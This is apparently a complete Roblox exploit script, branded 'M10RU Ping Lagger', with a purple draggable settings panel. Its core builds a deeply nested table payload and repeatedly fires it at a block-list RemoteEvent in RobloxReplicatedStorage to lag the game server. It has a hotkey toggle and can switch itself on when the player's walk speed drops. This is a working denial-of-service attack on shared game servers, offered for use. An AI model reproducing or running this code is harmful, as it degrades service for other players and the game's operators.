-- M10RU Ping Lagger v1 | Compact + Sliding Auto Activate
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local RunService       = game:GetService("RunService")
local TweenService     = game:GetService("TweenService")

local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

local ROYAL_DARK_BLUE = Color3.fromRGB(12, 10, 16)
local BTN_BLUE = Color3.fromRGB(112, 38, 190)
local UI_PURPLE = Color3.fromRGB(112, 38, 190)

-------------------------------------------------
-- ASSET ID FORMATTER
-------------------------------------------------
local function formatAssetId(id)
    if not id or id == "" then return "" end
    local cleanId = tostring(id):gsub("%D", "")
    return "rbxthumb://type=Asset&id=" .. cleanId .. "&w=420&h=420"
end

-------------------------------------------------
-- CONFIG & SAVE
-------------------------------------------------
local CONFIG_FILE = "M10RUPingLagger_Config.json"

local DEFAULT_CFG = {
	power        = 100000,
	interval     = 0.125,
	keybind      = "F",
    autoBrainrot = true,
    background  = formatAssetId("135008265511145"),
}

local cfg = {
	power        = DEFAULT_CFG.power,
	interval     = DEFAULT_CFG.interval,
	keybind      = DEFAULT_CFG.keybind,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    background  = DEFAULT_CFG.background,
}

local function resolveKey(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return (ok and val) or nil
end

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then
		pcall(writefile, CONFIG_FILE, encoded)
	end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end

	cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
	cfg.interval     = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybind      = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
    cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
    cfg.background  = type(data.background) == "string" and data.background or DEFAULT_CFG.background
end

loadConfig()

-------------------------------------------------
-- STATE
-------------------------------------------------
local active            = false
local listeningFor      = false
local remote            = nil
local brainrotMode      = false
local lastBrainrotState = false
local manualOverride    = false
local uiLocked          = false
local refreshUI

local BLACKLISTED = {
	[Enum.KeyCode.Escape]      = true,
	[Enum.KeyCode.LeftControl] = true,
	[Enum.KeyCode.Unknown]     = true,
}

-------------------------------------------------
-- CHARACTER TITLE
-------------------------------------------------
local function addCharacterTitle(character)
    local head = character:WaitForChild("Head", 10)
    if not head then return end

    local oldTitle = head:FindFirstChild("M10RUCharacterTitle")
    if oldTitle then oldTitle:Destroy() end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "M10RUCharacterTitle"
    billboard.Adornee = head
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.MaxDistance = 1000
    billboard.Size = UDim2.new(0, 260, 0, 32)
    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
    billboard.Parent = head

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "M10RU #1 Ping Lagger"
    label.TextColor3 = Color3.fromRGB(112, 38, 190)
    label.TextStrokeColor3 = Color3.fromRGB(24, 10, 42)
    label.TextStrokeTransparency = 0.1
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = billboard
end

plr.CharacterAdded:Connect(addCharacterTitle)
if plr.Character then
    task.spawn(addCharacterTitle, plr.Character)
end

-------------------------------------------------
-- PING LAGGER CORE
-------------------------------------------------
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end

remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local loopTask = nil
local function setLag(state)
	active = state
	if active then
		if not remote or not remote.Parent then
			remote = findRemote()
		end
		if loopTask then pcall(task.cancel, loopTask) end
		local payload = buildPayload(cfg.power)
		loopTask = task.spawn(function()
			local currentDelay = cfg.interval
			while active do
				if not remote or not remote.Parent then
					remote = findRemote()
					if not remote then task.wait(0.5) continue end
				end
				local ok = pcall(function()
					remote:FireServer(payload)
				end)
				if not ok then
					currentDelay = math.min(currentDelay * 1.5, 0.5)
				else
					currentDelay = math.max(currentDelay * 0.995, 0.05)
				end
				task.wait(currentDelay)
			end
		end)
	else
		if loopTask then pcall(task.cancel, loopTask) end
		loopTask = nil
	end
end

-------------------------------------------------
-- AUTO ACTIVATE DETECTION (WalkSpeed < 25)
-------------------------------------------------
RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then
			brainrotMode = false
			lastBrainrotState = false
		end
		return
	end

	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25

	if hasBrainrot and not lastBrainrotState then
		brainrotMode = true
		lastBrainrotState = true
		manualOverride = false
		if not active then
			setLag(true)
			if refreshUI then refreshUI() end
		end
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode = false
		lastBrainrotState = false
		manualOverride = false
		if active then
			setLag(false)
			if refreshUI then refreshUI() end
		end
	end
end)

-------------------------------------------------
-- GUI
-------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "M10RUPingLagger"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = UDim2.new(0, 220, 0, 90)
frame.Position = UDim2.new(0.5, -110, 0.5, -45)
frame.BackgroundColor3 = ROYAL_DARK_BLUE
frame.BorderSizePixel = 0
frame.Visible = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(145, 70, 210)
stroke.Transparency = 0.5
stroke.Thickness = 1
stroke.Parent = frame

local starContainer = Instance.new("Frame")
starContainer.Name = "StarSpaceContainer"
starContainer.Size = UDim2.fromScale(1, 1)
starContainer.BackgroundTransparency = 1
starContainer.ZIndex = 1
starContainer.ClipsDescendants = true
starContainer.Parent = frame

local stars = {}
for i = 1, 32 do
	local s = Instance.new("Frame")
	s.Size = UDim2.fromOffset(math.random(1, 3), math.random(1, 3))
	s.Position = UDim2.fromScale(math.random(), math.random())
	s.BackgroundColor3 = Color3.fromRGB(175, 110, 255)
	s.BorderSizePixel = 0
	s.BackgroundTransparency = math.random(20, 75) / 100
	s.ZIndex = 1
	s.Parent = starContainer
	Instance.new("UICorner", s).CornerRadius = UDim.new(1, 0)
	table.insert(stars, {
		frame = s,
		speedX = (math.random(-15, 15) / 100),
		speedY = (math.random(12, 35) / 100),
	})
end

RunService.RenderStepped:Connect(function(dt)
	for _, star in ipairs(stars) do
		local cur = star.frame.Position
		local newX = (cur.X.Scale + star.speedX * dt * 0.1) % 1
		local newY = (cur.Y.Scale + star.speedY * dt * 0.1) % 1
		star.frame.Position = UDim2.fromScale(newX, newY)
	end
end)

-- Purple title restored without bringing back the old opaque title strip.
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -92, 0, 26)
title.Position = UDim2.new(0, 10, 0, 4)
title.BackgroundTransparency = 1
title.Text = "M10RU Ping Lagger"
title.TextColor3 = UI_PURPLE
title.TextStrokeColor3 = Color3.fromRGB(24, 10, 42)
title.TextStrokeTransparency = 0.15
title.TextSize = 12
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 6
title.Parent = frame

local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.new(0, 22, 0, 22)
lockBtn.Position = UDim2.new(1, -54, 0, 6)
lockBtn.BackgroundColor3 = Color3.fromRGB(62, 25, 105)
lockBtn.Text = "🔓"
lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
lockBtn.TextSize = 11
lockBtn.Font = Enum.Font.GothamBold
lockBtn.ZIndex = 7
lockBtn.Parent = frame

local lockCorner = Instance.new("UICorner")
lockCorner.CornerRadius = UDim.new(0, 4)
lockCorner.Parent = lockBtn

-- Settings button (the old title-bar gear, now without a title bar)
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 22, 0, 22)
closeBtn.Position = UDim2.new(1, -29, 0, 6)
closeBtn.BackgroundColor3 = BTN_BLUE
closeBtn.Text = "⚙"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 16
closeBtn.Font = Enum.Font.GothamBold
closeBtn.ZIndex = 7
closeBtn.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 4)
closeCorner.Parent = closeBtn



-------------------------------------------------
-- OPTIONS
-------------------------------------------------
local settingsPanel = Instance.new("Frame")
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.new(0, 340, 0, 92)
settingsPanel.Position = UDim2.new(0, 10, 0, 32)
settingsPanel.BackgroundTransparency = 1
settingsPanel.Visible = false
settingsPanel.ZIndex = 8
settingsPanel.Parent = frame

local function createLabel(text, y)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0, 58, 0, 16)
	local x = text == "power:" and 0 or text == "delay:" and 112 or 224
	lbl.Position = UDim2.new(0, x, 0, 4)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = Color3.fromRGB(200, 210, 230)
	lbl.TextSize = 12
	lbl.Font = Enum.Font.Gotham
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.ZIndex = 5
	lbl.Parent = settingsPanel
	return lbl
end

local function createTextBox(text, y)
	local box = Instance.new("TextBox")
	box.Size = UDim2.new(0, 72, 0, 22)
	local x = y == 42 and 0 or 112
	box.Position = UDim2.new(0, x, 0, 22)
	box.BackgroundColor3 = UI_PURPLE
	box.TextColor3 = Color3.fromRGB(255, 255, 255)
	box.PlaceholderColor3 = Color3.fromRGB(150, 115, 175)
	box.TextSize = 12
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.ZIndex = 5
	box.Parent = settingsPanel

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 5)
	c.Parent = box
	return box
end

createLabel("power:", 45)
local powerBox = createTextBox(tostring(cfg.power), 42)
powerBox.PlaceholderText = "100000"

createLabel("delay:", 80)
local intervalBox = createTextBox(tostring(tonumber(string.format("%.3f", cfg.interval))), 77)
intervalBox.PlaceholderText = "0.125"

createLabel("Auto Act", 120)

local toggleTrack = Instance.new("Frame")
toggleTrack.Size = UDim2.new(0, 40, 0, 18)
toggleTrack.Position = UDim2.new(0, 224, 0, 22)
toggleTrack.BackgroundColor3 = cfg.autoBrainrot and BTN_BLUE or Color3.fromRGB(38, 25, 45)
toggleTrack.BorderSizePixel = 0
toggleTrack.ZIndex = 5
toggleTrack.Parent = settingsPanel

local trackCorner = Instance.new("UICorner")
trackCorner.CornerRadius = UDim.new(1, 0)
trackCorner.Parent = toggleTrack

local toggleKnob = Instance.new("Frame")
toggleKnob.Size = UDim2.new(0, 14, 0, 14)
toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
toggleKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleKnob.BorderSizePixel = 0
toggleKnob.ZIndex = 6
toggleKnob.Parent = toggleTrack

local knobCorner = Instance.new("UICorner")
knobCorner.CornerRadius = UDim.new(1, 0)
knobCorner.Parent = toggleKnob

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = ""
toggleBtn.ZIndex = 7
toggleBtn.Parent = toggleTrack

local keyLabel = Instance.new("TextLabel")
keyLabel.Size = UDim2.new(0, 40, 0, 16)
keyLabel.Position = UDim2.new(0, 272, 0, 4)
keyLabel.BackgroundTransparency = 1
keyLabel.Text = "key:"
keyLabel.TextColor3 = Color3.fromRGB(200, 210, 230)
keyLabel.TextSize = 12
keyLabel.Font = Enum.Font.Gotham
keyLabel.TextXAlignment = Enum.TextXAlignment.Left
keyLabel.ZIndex = 5
keyLabel.Parent = settingsPanel

local keybindBtn = Instance.new("TextButton")
keybindBtn.Size = UDim2.new(0, 40, 0, 22)
keybindBtn.Position = UDim2.new(0, 272, 0, 22)
keybindBtn.BackgroundColor3 = Color3.fromRGB(62, 25, 105)
keybindBtn.Text = cfg.keybind
keybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keybindBtn.TextSize = 12
keybindBtn.Font = Enum.Font.GothamBold
keybindBtn.ZIndex = 5
keybindBtn.Parent = settingsPanel

local keybindCorner = Instance.new("UICorner")
keybindCorner.CornerRadius = UDim.new(0, 5)
keybindCorner.Parent = keybindBtn

local lagBtn = Instance.new("TextButton")
lagBtn.Size = UDim2.new(0, 200, 0, 42)
lagBtn.Position = UDim2.new(0.5, -100, 1, -50)
lagBtn.BackgroundColor3 = Color3.fromRGB(112, 38, 190)
lagBtn.BackgroundTransparency = 0.35
lagBtn.BorderSizePixel = 0
lagBtn.Text = active and "ON" or "OFF"
lagBtn.TextColor3 = active and Color3.fromRGB(90, 255, 130) or Color3.fromRGB(255, 80, 80)
lagBtn.TextStrokeColor3 = Color3.fromRGB(15, 5, 25)
lagBtn.TextStrokeTransparency = 0.15
lagBtn.TextSize = 18
lagBtn.Font = Enum.Font.GothamBlack
lagBtn.ZIndex = 5
lagBtn.Parent = frame

local lagCorner = Instance.new("UICorner")
lagCorner.CornerRadius = UDim.new(0, 10)
lagCorner.Parent = lagBtn

local lagStroke = Instance.new("UIStroke")
lagStroke.Color = Color3.fromRGB(165, 85, 255)
lagStroke.Transparency = 0.25
lagStroke.Thickness = 1.4
lagStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
lagStroke.Parent = lagBtn

local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.Size = UDim2.new(0, 70, 0, 26)
toggle.Position = UDim2.new(0, 12, 0.5, -13)
toggle.BackgroundColor3 = BTN_BLUE
toggle.Text = "M10RU"
toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 12
toggle.Visible = false
toggle.ZIndex = 20
toggle.Parent = screenGui

local toggleCorner2 = Instance.new("UICorner")
toggleCorner2.CornerRadius = UDim.new(0, 8)
toggleCorner2.Parent = toggle

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = Color3.fromRGB(255, 255, 255)
toggleStroke.Transparency = 0.75
toggleStroke.Thickness = 1
toggleStroke.Parent = toggle

-- Frame resizing buttons (+ and -)
local zoomInBtn = Instance.new("TextButton")
zoomInBtn.Name = "ZoomInButton"
zoomInBtn.Size = UDim2.new(0, 32, 0, 26)
zoomInBtn.Position = UDim2.new(0, 10, 0, 58)
zoomInBtn.BackgroundColor3 = Color3.fromRGB(62, 25, 105)
zoomInBtn.BorderSizePixel = 0
zoomInBtn.Text = "+"
zoomInBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
zoomInBtn.TextSize = 16
zoomInBtn.Font = Enum.Font.GothamBold
zoomInBtn.ZIndex = 9
zoomInBtn.Parent = settingsPanel

local zoomInCorner = Instance.new("UICorner")
zoomInCorner.CornerRadius = UDim.new(0, 7)
zoomInCorner.Parent = zoomInBtn

local zoomOutBtn = Instance.new("TextButton")
zoomOutBtn.Name = "ZoomOutButton"
zoomOutBtn.Size = UDim2.new(0, 32, 0, 26)
zoomOutBtn.Position = UDim2.new(0, 48, 0, 58)
zoomOutBtn.BackgroundColor3 = Color3.fromRGB(62, 25, 105)
zoomOutBtn.BorderSizePixel = 0
zoomOutBtn.Text = "-"
zoomOutBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
zoomOutBtn.TextSize = 16
zoomOutBtn.Font = Enum.Font.GothamBold
zoomOutBtn.ZIndex = 9
zoomOutBtn.Parent = settingsPanel

local zoomOutCorner = Instance.new("UICorner")
zoomOutCorner.CornerRadius = UDim.new(0, 7)
zoomOutCorner.Parent = zoomOutBtn

-- Scale the play panel from its center. Settings keep a safe fixed layout while open.
local currentFrameWidth = 220
local currentFrameHeight = 90
local settingsOpen = false
local MIN_FRAME_WIDTH = 220
local MIN_FRAME_HEIGHT = 90
local MAX_FRAME_WIDTH = 360
local MAX_FRAME_HEIGHT = 160
local ZOOM_STEP_WIDTH = 20
local ZOOM_STEP_HEIGHT = 15

local function applyPlaySize(animated)
    if settingsOpen then return end
    local target = {
        Size = UDim2.new(0, currentFrameWidth, 0, currentFrameHeight),
        Position = UDim2.new(0.5, -currentFrameWidth / 2, 0.5, -currentFrameHeight / 2),
    }
    local buttonTarget = {
        Position = UDim2.new(0.5, -100, 1, -50),
    }
    if animated then
        local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
        TweenService:Create(frame, tweenInfo, target):Play()
        TweenService:Create(lagBtn, tweenInfo, buttonTarget):Play()
    else
        frame.Size = target.Size
        frame.Position = target.Position
        lagBtn.Position = buttonTarget.Position
    end
end

zoomInBtn.MouseButton1Click:Connect(function()
    currentFrameWidth = math.min(currentFrameWidth + ZOOM_STEP_WIDTH, MAX_FRAME_WIDTH)
    currentFrameHeight = math.min(currentFrameHeight + ZOOM_STEP_HEIGHT, MAX_FRAME_HEIGHT)
    applyPlaySize(true)
end)

zoomOutBtn.MouseButton1Click:Connect(function()
    currentFrameWidth = math.max(currentFrameWidth - ZOOM_STEP_WIDTH, MIN_FRAME_WIDTH)
    currentFrameHeight = math.max(currentFrameHeight - ZOOM_STEP_HEIGHT, MIN_FRAME_HEIGHT)
    applyPlaySize(true)
end)

-------------------------------------------------
-- LOGIC & UI UPDATES
-------------------------------------------------
local function makeMenuDraggable()
	local dragging, dragStart, startAbsPos = false, nil, nil
	frame.InputBegan:Connect(function(input)
		if uiLocked then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startAbsPos = frame.AbsolutePosition
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
				local viewport = workspace.CurrentCamera.ViewportSize
				local EDGE_VISIBLE = 46

				-- Let the panel move partly outside the left/right edges so its text
				-- can be hidden, while keeping a small visible part for dragging it back.
				local minX = -frame.AbsoluteSize.X + EDGE_VISIBLE
				local maxX = viewport.X - EDGE_VISIBLE
				local newX = math.clamp(startAbsPos.X + delta.X, minX, maxX)
				local newY = math.clamp(startAbsPos.Y + delta.Y, 0, viewport.Y - frame.AbsoluteSize.Y)

				frame.Position = UDim2.new(0, newX, 0, newY)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

local function makeToggleDraggable()
	local dragging, dragStart, startAbsPos = false, nil, nil
	toggle.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startAbsPos = toggle.AbsolutePosition
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			local viewport = workspace.CurrentCamera.ViewportSize

			local newX = math.clamp(startAbsPos.X + delta.X, 0, viewport.X - toggle.AbsoluteSize.X)
			local newY = math.clamp(startAbsPos.Y + delta.Y, 0, viewport.Y - toggle.AbsoluteSize.Y)

			toggle.Position = UDim2.new(0, newX, 0, newY)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

makeMenuDraggable()
makeToggleDraggable()

local function updateToggleVisual()
	local goalPos = cfg.autoBrainrot and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
	local goalColor = cfg.autoBrainrot and BTN_BLUE or Color3.fromRGB(38, 25, 45)
	TweenService:Create(toggleKnob, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Position = goalPos}):Play()
	TweenService:Create(toggleTrack, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundColor3 = goalColor}):Play()
end

refreshUI = function()
	powerBox.Text = tostring(cfg.power)
	intervalBox.Text = tostring(tonumber(string.format("%.3f", cfg.interval)))
	keybindBtn.Text = listeningFor and "..." or cfg.keybind
	updateToggleVisual()
	lockBtn.Text = uiLocked and "🔒" or "🔓"
	lagBtn.Text = active and "ON" or "OFF"
	lagBtn.TextColor3 = active and Color3.fromRGB(90, 255, 130) or Color3.fromRGB(255, 80, 80)
end

powerBox.FocusLost:Connect(function()
	local num = tonumber(powerBox.Text)
	if num and num >= 1 then cfg.power = math.floor(num) saveConfig() end
	refreshUI()
end)

intervalBox.FocusLost:Connect(function()
	local num = tonumber(intervalBox.Text)
	if num and num >= 0.01 then cfg.interval = num saveConfig() end
	refreshUI()
end)

keybindBtn.MouseButton1Click:Connect(function() listeningFor = true refreshUI() end)

toggleBtn.MouseButton1Click:Connect(function()
	cfg.autoBrainrot = not cfg.autoBrainrot
	if cfg.autoBrainrot then
		manualOverride = false
	end
	saveConfig()
	refreshUI()
end)

lagBtn.MouseButton1Click:Connect(function()
	active = not active
	manualOverride = not active
	setLag(active)
	refreshUI()
end)

lockBtn.MouseButton1Click:Connect(function()
	uiLocked = not uiLocked
	refreshUI()
end)



closeBtn.MouseButton1Click:Connect(function()
	settingsOpen = not settingsOpen
	settingsPanel.Visible = settingsOpen
	lagBtn.Visible = not settingsOpen
    
local targetSize = settingsOpen and UDim2.new(0, 360, 0, 140) or UDim2.new(0, currentFrameWidth, 0, currentFrameHeight)
		local targetPosition = settingsOpen and UDim2.new(0.5, -180, 0.5, -70) or UDim2.new(0.5, -currentFrameWidth / 2, 0.5, -currentFrameHeight / 2)
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad)
		TweenService:Create(frame, tweenInfo, {
			Size = targetSize,
			Position = targetPosition,
		}):Play()
		if not settingsOpen then
			TweenService:Create(lagBtn, tweenInfo, {
				Position = UDim2.new(0.5, -100, 1, -50),
			}):Play()
		end
end)

UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	if kc == Enum.KeyCode.Unknown then return end
	if listeningFor then
		if kc == Enum.KeyCode.Escape then listeningFor = false refreshUI() return end
		if not BLACKLISTED[kc] then cfg.keybind = kc.Name listeningFor = false saveConfig() refreshUI() end
		return
	end
	if processed then return end
	local keyEnum = resolveKey(cfg.keybind)
	if keyEnum and kc == keyEnum then
		active = not active
		manualOverride = not active
		setLag(active)
		refreshUI()
	end
end)

refreshUI()